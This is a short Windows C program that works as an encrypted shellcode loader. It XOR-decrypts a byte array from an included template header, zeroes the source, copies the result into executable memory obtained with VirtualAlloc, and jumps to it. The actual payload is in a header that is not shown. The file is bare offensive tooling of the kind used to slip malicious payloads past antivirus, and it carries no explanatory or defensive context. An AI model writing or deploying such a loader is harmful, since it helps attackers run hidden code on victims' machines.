#include <windows.h>
#include <stdio.h>

#include "main.h"
#include "shellcode_template.h"

int main() {

	int i;
	unsigned char decrypted_bytes[array_len + 1] = {};

	for (i = 0; i < array_len; i++) {
    	decrypted_bytes[i] = key_one ^ shellcode[i];
      shellcode[i] = '\0';
  }

	void *exec = VirtualAlloc(0, sizeof decrypted_bytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, decrypted_bytes, sizeof decrypted_bytes);
	((void(*)())exec)();
	exit(1);
}
